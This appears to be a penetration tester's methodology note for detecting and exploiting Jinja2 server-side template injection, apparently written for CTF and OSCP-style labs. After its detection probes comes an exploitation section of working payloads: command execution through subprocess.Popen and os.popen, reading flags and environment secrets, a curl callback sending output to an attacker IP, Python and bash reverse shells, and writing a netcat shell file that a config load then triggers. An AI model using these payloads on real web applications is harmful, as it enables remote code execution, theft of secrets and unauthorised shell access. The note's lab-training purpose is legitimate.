
## Goal

Confirm Jinja-style SSTI, identify working syntax/constraints, and route cleanly based on output.

**==IMPORTANT NOTE==** PREFIX RULE: When a step says "working prefix = X", copy everything from {{ up to (but not including) popen/read/__import__ etc. and paste it at the start of Exploitation payloads.

Example: prefix = {{config.__class__.__init__.__globals__['os'].   → Exploitation becomes {{config.__class__.__init__.__globals__['os'].Popen(... etc.

## 1. Confirm expression evaluation

Payload:
`{{7*7}}`

- `49` returned -> continue
- payload reflected unchanged -> Jinja2 SSTI not present -> reevaluate attack path
- parser/server error -> record error text, continue

## 2. Confirm string rendering

Payload:
`{{"test"}}`

- `test` returned -> continue
- blocked/error -> record exact behaviour, continue

## 3. Test top-level object access

Payload:
`{{config}}`

- object/value rendered -> record `config works`
- empty/blocked/error -> record `config blocked`

Payload:
`{{request}}`

- object/value rendered -> record `request works`
- empty/blocked/error -> record `request blocked`

## 4. Branch from the top-level result

- If `config works` -> go to step 5
- If `request works` -> go to step 6
- If both are blocked -> go to step 7

## 5. If `config` works, test controlled expansion

Payloads:
`{{config.items()}}`
`{{config|string}}`

- useful output returned -> record what shape is allowed, continue to step 6 if `request` worked, else continue to [[Jinja2 SSTI#8. Choose the live branch]]
- blocked/error -> record restriction, continue to step 6 if `request` worked, else continue to step 7.

## 6. If `request` works, test controlled expansion

Payloads:
`{{request.method}}`
`{{request.path}}`
`{{request.args}}`

- useful output returned -> record what access style works, continue to [[Jinja2 SSTI#8. Choose the live branch]]
- blocked/error -> record restriction, continue to step 7

## 7. Test access style and syntax constraints

Payloads:
`{{"a"|upper}}`
`{{7+7}}`
`{{''.__class__}}`
`{{request["args"]}}`

For each payload, record only:
- works
- blocked
- error

## 8. Choose the live branch

- If `config works` -> [[Jinja2 SSTI - Config Branch]]
- Else if `request works` -> [[Jinja2 SSTI - Request Branch]]
- Else if syntax works but top-level objects are blocked -> [[Jinja2 SSTI - Bypass Branch]]
- Else -> leave this note (you will need to try a different attack vector)
### Exploitation Section (once RCE works - same for all branches)

##### **1. Command enumeration (test output first – replace COMMAND)** Use your prefix + one of these patterns. Start with A (most reliable).

A. **Preferred:** subprocess.Popen + communicate (handles output better than popen in restricted envs) Payload template: 

`{{PREFIXsubprocess.Popen('COMMAND',shell=True,stdout=-1).communicate()[0].strip()}}` 

(or if prefix ends at __import__('subprocess').: 

`{{PREFIXPopen('COMMAND',shell=True,stdout=-1).communicate()[0].strip()}})`

Common COMMAND tests (replace one at a time):

- 'id' → expect uid=... gid=...
- 'whoami' → expect username (e.g. www-data)
- 'uname -a' → kernel/OS info
- 'ls -la /' → root dir listing
- 'cat /flag.txt' or 'cat /home/*/flag*' or 'find / -name flag* 2>/dev/null | xargs cat' (for THM/OSCP flags)
- 'env' → env vars (look for secrets)
- Output appears → success. Record prefix + pattern for reuse. Go to 3 (reverse shell) if needed.
- Empty / bytes gibberish → add .decode(): .communicate()[0].decode().strip() → retry.
- Error / blocked → go to B.

B. Fallback: os.popen (try if Popen blocked) Payload template: {{PREFIXpopen('COMMAND').read()}}

- Output → good, stick with popen for this session.
- Empty / no output → go to 2 (blind/force tricks or index hunt).

##### **2. Blind or no-output fixes (if commands run but nothing renders)** Append one of these to force output:

- .zfill(9999) (pads with zeros – useful if output is swallowed) Example: {{PREFIXPopen('id',shell=True,stdout=-1).communicate()[0].zfill(9999)}}
- Base64 encode: {{PREFIXPopen('id',shell=True,stdout=-1).communicate()[0]|b64encode}} (decode locally with echo "BASE64HERE" | base64 -d)
- Warning-loop variant (context-free, no prefix needed – paste exactly): {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('subprocess').Popen('id',shell=True,stdout=-1).communicate()[0].strip()}}{% endif %}{% endfor %} (replace 'id' with your COMMAND)
- If still blind → use callback: 'curl http://YOUR_IP:8000/$(id|base64)' and listen with python3 -m http.server 8000 or nc -lvnp 8000

##### **3. Reverse shell (interactive when enum done)** Use same prefix + pattern from step 1.

Preferred payload (Python3 one-liner – reliable in most labs): {{PREFIXPopen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\',shell=True,stdout=-1).communicate()[0]}}

- Replace YOUR_IP and port.
- Listener: rlwrap nc -lvnp 4444 (or socat / pwncat).
- Output empty but shell connects → success (blind revshell).
- Fails → try bash variant: 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'

##### **4. File write (if needed – e.g. evil config / webshell)** If you have file write class from earlier (e.g. index 111–150 for _io.FileIO or similar): Payload template: {{PREFIX[INDEX]('/tmp/evil.py','w').write('import os;os.system("nc YOUR_IP 4444 -e /bin/sh")')}}

- Adjust path/content.
- Trigger: if config access → {{config.from_pyfile('/tmp/evil.py')}} or visit page that loads it.
- Index hunt if unknown: reuse file-read chain from branch step 4, swap .read() for ('w').write('PAYLOAD')
